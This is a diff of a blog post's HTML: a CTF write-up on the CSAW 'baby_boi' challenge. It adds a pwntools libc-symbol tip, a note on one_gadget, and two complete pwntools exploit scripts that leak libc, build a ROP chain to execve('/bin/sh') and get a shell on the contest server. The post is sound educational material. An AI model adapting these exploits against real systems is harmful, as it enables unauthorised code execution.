@@ -117,7 +117,7 @@ baby_boi is pretty much the simplest possible modern ROP (the modern security pr
 		<p class="post-meta">
 		
 		2019-09-15
-		(1702 words)
+		(1867 words)
 		
 		<span class="post-categories">
 			filed under
@@ -149,7 +149,7 @@ baby_boi is pretty much the simplest possible modern ROP (the modern security pr
 <li>A Linux machine. A VM is fine. You might want one even if your machine is already running Linux, so that you reduce the chances of CTF stuff messing with the rest of your machine.</li>
 <li>Python, and the Python library <a href="https://github.com/Gallopsled/pwntools#readme"><code>pwntools</code></a>, which is the library everybody and their mom use for interacting with binaries in CTFs. It’s extremely useful. As of time of writing it’s Python 2 only; there exists a <a href="https://github.com/arthaud/python3-pwntools">Python 3</a> fork that is no longer maintained, but also works well enough. I wrote my script against the Python 3 fork, but the differences from Python 2 are small. (Hopefully we’ll have a supported Python 3 version before Python 2 stops being supported…) It also comes with a few very useful command-line utilities, particularly <code>checksec</code>.</li>
 <li>The Python utility <a href="https://github.com/JonathanSalwan/ROPgadget"><code>ROPgadget</code></a>, which we will use for finding ROP gadgets.</li>
-<li>(optional because it didn’t work, but useful to know) The Ruby utility <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>.</li>
+<li>(optional, but useful) The Ruby utility <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>.</li>
 <li>Some other utilities that I think might come with Linux, but if not you should know what to Google: <code>file</code>, <code>gdb</code>, <code>readelf</code>, <code>strings</code>. In general I’d suggest setting up <code>gdb</code> with <a href="https://github.com/pwndbg/pwndbg"><code>pwndbg</code></a> and <a href="https://github.com/snare/voltron"><code>voltron</code></a>, but I don’t think you need anything other than basic <code>gdb</code> functionality (if that) for this challenge.</li>
 </ul>
 <p>Okay, let’s get ROPping.</p>
@@ -177,6 +177,9 @@ Here I am: 0x7f3c0a0b3e80</code></pre>
 <pre><code>$ readelf -s libc-2.27.so | grep &#39; printf@&#39;
    627: 0000000000064e80   195 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5</code></pre>
 <p>So <code>printf</code> is at offset <code>0x64e80</code> in the server’s libc. (As confirmation that this is correct, you’ll note that the last three hex digits are the same as the address we got above, because ASLR only randomizes addresses with a granularity of <code>0x1000</code>.) Therefore, we can calculate the runtime address of anything else in libc by taking the pointer we’re given, subtracting <code>0x64e80</code>, and adding the fixed offset calculated from our copy of libc.</p>
+<p>Note: You can also acquire this from directly inside your exploit script with <code>pwntools</code>, as well as let <code>pwntools</code> handle some offset calculations. This requires slightly more setup as you have to install more things to give <code>pwntools</code> the capability, and I’m not used to doing it, but it’s probably worth knowing.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" data-line-number="1">libc <span class="op">=</span> ELF(<span class="st">&#39;libc-2.27.so&#39;</span>)</a>
+<a class="sourceLine" id="cb6-2" data-line-number="2">libc.symbols[<span class="st">&#39;printf&#39;</span>]</a></code></pre></div>
 <h3 id="building-the-rop-chain">Building the ROP Chain</h3>
 <p>Let’s use <code>ROPgadget</code> to look for gadgets. We’ll pick out the ones we want later. (This might take a few seconds or minutes, so we’d want to save the results into a text file and search it with our favorite text editor.)</p>
 <pre><code>$ ROPgadget --binary libc-2.27.so &gt; gadgets.txt</code></pre>
@@ -208,7 +211,7 @@ Here I am: 0x7f3c0a0b3e80</code></pre>
  1b3e9a /bin/sh</code></pre>
 <p>(<code>-t</code> prints positions; with <code>x</code> as its argument, the positions are formatted in hexadecimal.)</p>
 <h3 id="sidebar-one_gadget">Sidebar: <code>one_gadget</code></h3>
-<p>When you have control of one return address, <code>one_gadget</code> is usually worth checking. It identifies single locations you can jump to that might give you a shell directly, with no further gadgets, if other constraints are also satisfied. It’s often faster to just try jumping to them and seeing if you get a shell, instead of manually seeing if the constraints are satisfied. In this case I don’t think they were.</p>
+<p>When you have control of one return address, <code>one_gadget</code> is usually worth checking. It identifies single locations you can jump to that might give you a shell directly, with no further gadgets, if other constraints are also satisfied. It’s often faster to just try jumping to them and seeing if you get a shell, instead of manually seeing if the constraints are satisfied. In this case I don’t think they were. <ins datetime="2019-09-15T23:04:31-0400">(Update: I could have sworn I tried all three one_gadget addresses during the contest and none of them worked, but they all work for me now, and judging by other writeups they worked for other people too.)</ins></p>
 <pre><code>$ one_gadget libc-2.27.so
 0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
 constraints:
@@ -222,49 +225,49 @@ constraints:
 constraints:
   [rsp+0x70] == NULL</code></pre>
 <h3 id="the-full-exploit">The Full Exploit</h3>
-<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb12-1" data-line-number="1"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
-<a class="sourceLine" id="cb12-2" data-line-number="2"></a>
-<a class="sourceLine" id="cb12-3" data-line-number="3"><span class="co"># One of the many magic things pwntools does is that you can accept arguments</span></a>
-<a class="sourceLine" id="cb12-4" data-line-number="4"><span class="co"># from the environment or command line with zero setup, e.g. run this script as</span></a>
-<a class="sourceLine" id="cb12-5" data-line-number="5"><span class="co">#</span></a>
-<a class="sourceLine" id="cb12-6" data-line-number="6"><span class="co">#     $ python exploit.py REMOTE</span></a>
-<a class="sourceLine" id="cb12-7" data-line-number="7"><span class="co">#</span></a>
-<a class="sourceLine" id="cb12-8" data-line-number="8"><span class="co"># to run it against the remote server, or don&#39;t pass REMOTE to run it locally.</span></a>
-<a class="sourceLine" id="cb12-9" data-line-number="9"></a>
-<a class="sourceLine" id="cb12-10" data-line-number="10"><span class="cf">if</span> args[<span class="st">&#39;REMOTE&#39;</span>]:</a>
-<a class="sourceLine" id="cb12-11" data-line-number="11">    conn <span class="op">=</span> remote(<span class="st">&#39;pwn.chal.csaw.io&#39;</span>, <span class="dv">1005</span>)</a>
-<a class="sourceLine" id="cb12-12" data-line-number="12"><span class="cf">else</span>:</a>
-<a class="sourceLine" id="cb12-13" data-line-number="13">    conn <span class="op">=</span> process(<span class="st">&#39;baby_boi&#39;</span>)</a>
-<a class="sourceLine" id="cb12-14" data-line-number="14"></a>
-<a class="sourceLine" id="cb12-15" data-line-number="15"><span class="co"># conn.recvuntil(&quot;some string&quot;) is often more useful, but the input here</span></a>
-<a class="sourceLine" id="cb12-16" data-line-number="16"><span class="co"># doesn&#39;t have a super obvious terminator, so we read line by line.</span></a>
-<a class="sourceLine" id="cb12-17" data-line-number="17">conn.recvline()</a>
-<a class="sourceLine" id="cb12-18" data-line-number="18">ptr_line <span class="op">=</span> conn.recvline()</a>
-<a class="sourceLine" id="cb12-19" data-line-number="19">ptr_text <span class="op">=</span> re.search(<span class="vs">r&#39;0x([0-9a-z]+)&#39;</span>, ptr_line.decode(<span class="st">&#39;utf-8&#39;</span>)).group(<span class="dv">1</span>)</a>
-<a class="sourceLine" id="cb12-20" data-line-number="20">printf_ptr <span class="op">=</span> <span class="bu">int</span>(ptr_text, <span class="dv">16</span>)</a>
-<a class="sourceLine" id="cb12-21" data-line-number="21">libc_base <span class="op">=</span> printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span></a>
-<a class="sourceLine" id="cb12-22" data-line-number="22"></a>
-<a class="sourceLine" id="cb12-23" data-line-number="23"><span class="co"># The ROP chain, using these offsets as found above:</span></a>
-<a class="sourceLine" id="cb12-24" data-line-number="24"><span class="co"># 0x00000000000439c8 : pop rax ; ret</span></a>
-<a class="sourceLine" id="cb12-25" data-line-number="25"><span class="co"># 0x000000000002155f : pop rdi ; ret</span></a>
-<a class="sourceLine" id="cb12-26" data-line-number="26"><span class="co"># 0x00000000001306d9 : pop rdx ; pop rsi ; ret</span></a>
-<a class="sourceLine" id="cb12-27" data-line-number="27"><span class="co"># 0x1b3e9a /bin/sh</span></a>
-<a class="sourceLine" id="cb12-28" data-line-number="28"><span class="co"># 0x00000000000d2975 : syscall ; ret</span></a>
-<a class="sourceLine" id="cb12-29" data-line-number="29">exploit <span class="op">=</span> b<span class="st">&quot;a&quot;</span> <span class="op">*</span> <span class="dv">40</span> <span class="co"># padding</span></a>
-<a class="sourceLine" id="cb12-30" data-line-number="30">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x439c8</span>) <span class="co"># `pop rax ; ret`</span></a>
-<a class="sourceLine" id="cb12-31" data-line-number="31">exploit <span class="op">+=</span> p64(<span class="dv">59</span>) <span class="co"># execve&#39;s syscall number, popped into rax</span></a>
-<a class="sourceLine" id="cb12-32" data-line-number="32">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x2155f</span>) <span class="co"># `pop rdi ; ret`</span></a>
-<a class="sourceLine" id="cb12-33" data-line-number="33">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x1b3e9a</span>) <span class="co"># &quot;/bin/sh&quot;</span></a>
-<a class="sourceLine" id="cb12-34" data-line-number="34">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x1306d9</span>) <span class="co"># `pop rdx ; pop rsi ; ret`</span></a>
-<a class="sourceLine" id="cb12-35" data-line-number="35">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rdx</span></a>
-<a class="sourceLine" id="cb12-36" data-line-number="36">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rsi</span></a>
-<a class="sourceLine" id="cb12-37" data-line-number="37">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0xd2975</span>) <span class="co"># `syscall; ret`</span></a>
-<a class="sourceLine" id="cb12-38" data-line-number="38">exploit <span class="op">+=</span> b<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span></a>
-<a class="sourceLine" id="cb12-39" data-line-number="39"></a>
-<a class="sourceLine" id="cb12-40" data-line-number="40"><span class="co"># Send the exploit</span></a>
-<a class="sourceLine" id="cb12-41" data-line-number="41">conn.sendline(exploit)</a>
-<a class="sourceLine" id="cb12-42" data-line-number="42"><span class="co"># This should pop a shell, so now let us interact with the shell</span></a>
-<a class="sourceLine" id="cb12-43" data-line-number="43">conn.interactive()</a></code></pre></div>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb13-1" data-line-number="1"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb13-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb13-3" data-line-number="3"><span class="co"># One of the many magic things pwntools does is that you can accept arguments</span></a>
+<a class="sourceLine" id="cb13-4" data-line-number="4"><span class="co"># from the environment or command line with zero setup, e.g. run this script as</span></a>
+<a class="sourceLine" id="cb13-5" data-line-number="5"><span class="co">#</span></a>
+<a class="sourceLine" id="cb13-6" data-line-number="6"><span class="co">#     $ python exploit.py REMOTE</span></a>
+<a class="sourceLine" id="cb13-7" data-line-number="7"><span class="co">#</span></a>
+<a class="sourceLine" id="cb13-8" data-line-number="8"><span class="co"># to run it against the remote server, or don&#39;t pass REMOTE to run it locally.</span></a>
+<a class="sourceLine" id="cb13-9" data-line-number="9"></a>
+<a class="sourceLine" id="cb13-10" data-line-number="10"><span class="cf">if</span> args[<span class="st">&#39;REMOTE&#39;</span>]:</a>
+<a class="sourceLine" id="cb13-11" data-line-number="11">    conn <span class="op">=</span> remote(<span class="st">&#39;pwn.chal.csaw.io&#39;</span>, <span class="dv">1005</span>)</a>
+<a class="sourceLine" id="cb13-12" data-line-number="12"><span class="cf">else</span>:</a>
+<a class="sourceLine" id="cb13-13" data-line-number="13">    conn <span class="op">=</span> process(<span class="st">&#39;baby_boi&#39;</span>)</a>
+<a class="sourceLine" id="cb13-14" data-line-number="14"></a>
+<a class="sourceLine" id="cb13-15" data-line-number="15"><span class="co"># conn.recvuntil(&quot;some string&quot;) is often more useful, but the input here</span></a>
+<a class="sourceLine" id="cb13-16" data-line-number="16"><span class="co"># doesn&#39;t have a super obvious terminator, so we read line by line.</span></a>
+<a class="sourceLine" id="cb13-17" data-line-number="17">conn.recvline()</a>
+<a class="sourceLine" id="cb13-18" data-line-number="18">ptr_line <span class="op">=</span> conn.recvline()</a>
+<a class="sourceLine" id="cb13-19" data-line-number="19">ptr_text <span class="op">=</span> re.search(<span class="vs">r&#39;0x([0-9a-z]+)&#39;</span>, ptr_line.decode(<span class="st">&#39;utf-8&#39;</span>)).group(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb13-20" data-line-number="20">printf_ptr <span class="op">=</span> <span class="bu">int</span>(ptr_text, <span class="dv">16</span>)</a>
+<a class="sourceLine" id="cb13-21" data-line-number="21">libc_base <span class="op">=</span> printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span></a>
+<a class="sourceLine" id="cb13-22" data-line-number="22"></a>
+<a class="sourceLine" id="cb13-23" data-line-number="23"><span class="co"># The ROP chain, using these offsets as found above:</span></a>
+<a class="sourceLine" id="cb13-24" data-line-number="24"><span class="co"># 0x00000000000439c8 : pop rax ; ret</span></a>
+<a class="sourceLine" id="cb13-25" data-line-number="25"><span class="co"># 0x000000000002155f : pop rdi ; ret</span></a>
+<a class="sourceLine" id="cb13-26" data-line-number="26"><span class="co"># 0x00000000001306d9 : pop rdx ; pop rsi ; ret</span></a>
+<a class="sourceLine" id="cb13-27" data-line-number="27"><span class="co"># 0x1b3e9a /bin/sh</span></a>
+<a class="sourceLine" id="cb13-28" data-line-number="28"><span class="co"># 0x00000000000d2975 : syscall ; ret</span></a>
+<a class="sourceLine" id="cb13-29" data-line-number="29">exploit <span class="op">=</span> b<span class="st">&quot;a&quot;</span> <span class="op">*</span> <span class="dv">40</span> <span class="co"># padding</span></a>
+<a class="sourceLine" id="cb13-30" data-line-number="30">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x439c8</span>) <span class="co"># `pop rax ; ret`</span></a>
+<a class="sourceLine" id="cb13-31" data-line-number="31">exploit <span class="op">+=</span> p64(<span class="dv">59</span>) <span class="co"># execve&#39;s syscall number, popped into rax</span></a>
+<a class="sourceLine" id="cb13-32" data-line-number="32">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x2155f</span>) <span class="co"># `pop rdi ; ret`</span></a>
+<a class="sourceLine" id="cb13-33" data-line-number="33">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x1b3e9a</span>) <span class="co"># &quot;/bin/sh&quot;</span></a>
+<a class="sourceLine" id="cb13-34" data-line-number="34">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x1306d9</span>) <span class="co"># `pop rdx ; pop rsi ; ret`</span></a>
+<a class="sourceLine" id="cb13-35" data-line-number="35">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rdx</span></a>
+<a class="sourceLine" id="cb13-36" data-line-number="36">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rsi</span></a>
+<a class="sourceLine" id="cb13-37" data-line-number="37">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0xd2975</span>) <span class="co"># `syscall; ret`</span></a>
+<a class="sourceLine" id="cb13-38" data-line-number="38">exploit <span class="op">+=</span> b<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span></a>
+<a class="sourceLine" id="cb13-39" data-line-number="39"></a>
+<a class="sourceLine" id="cb13-40" data-line-number="40"><span class="co"># Send the exploit</span></a>
+<a class="sourceLine" id="cb13-41" data-line-number="41">conn.sendline(exploit)</a>
+<a class="sourceLine" id="cb13-42" data-line-number="42"><span class="co"># This should pop a shell, so now let us interact with the shell</span></a>
+<a class="sourceLine" id="cb13-43" data-line-number="43">conn.interactive()</a></code></pre></div>
 <p>And, the fun part:</p>
 <pre><code>$ python3 exploit.py REMOTE
 [+] Opening connection to pwn.chal.csaw.io on port 1005: Done
@@ -273,7 +276,23 @@ $ ls
 baby_boi
 flag.txt
 $ cat flag.txt
-flag{baby_boi_dodooo_doo_doo_dooo}</code></pre></article>
+flag{baby_boi_dodooo_doo_doo_dooo}</code></pre>
+<h3 id="one_gadget-version"><code>one_gadget</code> version</h3>
+<p>The version I could have sworn I tried during the contest and didn’t work, but works for me now. Everything should look familiar except for <code>0x4f2c5</code>, which was one of the gadgets <code>one_gadget</code> found for us. The other one_gadgets at <code>0x4f322</code> and <code>0x10a38c</code> also work.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb15-1" data-line-number="1"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb15-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb15-3" data-line-number="3"><span class="cf">if</span> args[<span class="st">&#39;REMOTE&#39;</span>]:</a>
+<a class="sourceLine" id="cb15-4" data-line-number="4">    conn <span class="op">=</span> remote(<span class="st">&#39;pwn.chal.csaw.io&#39;</span>, <span class="dv">1005</span>)</a>
+<a class="sourceLine" id="cb15-5" data-line-number="5"><span class="cf">else</span>:</a>
+<a class="sourceLine" id="cb15-6" data-line-number="6">    conn <span class="op">=</span> process(<span class="st">&#39;baby_boi&#39;</span>)</a>
+<a class="sourceLine" id="cb15-7" data-line-number="7"></a>
+<a class="sourceLine" id="cb15-8" data-line-number="8">conn.recvline()</a>
+<a class="sourceLine" id="cb15-9" data-line-number="9">ptr_line <span class="op">=</span> conn.recvline()</a>
+<a class="sourceLine" id="cb15-10" data-line-number="10">ptr_text <span class="op">=</span> re.search(<span class="vs">r&#39;0x([0-9a-z]+)&#39;</span>, ptr_line.decode(<span class="st">&#39;utf-8&#39;</span>)).group(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb15-11" data-line-number="11">printf_ptr <span class="op">=</span> <span class="bu">int</span>(ptr_text, <span class="dv">16</span>)</a>
+<a class="sourceLine" id="cb15-12" data-line-number="12">libc_base <span class="op">=</span> printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span></a>
+<a class="sourceLine" id="cb15-13" data-line-number="13">conn.sendline(b<span class="st">&quot;a&quot;</span> <span class="op">*</span> <span class="dv">40</span> <span class="op">+</span> p64(libc_base <span class="op">+</span> <span class="bn">0x4f2c5</span>))</a>
+<a class="sourceLine" id="cb15-14" data-line-number="14">conn.interactive()</a></code></pre></div></article>
 	<footer class="post-footer">
 		
 		<ul class="post-tags">
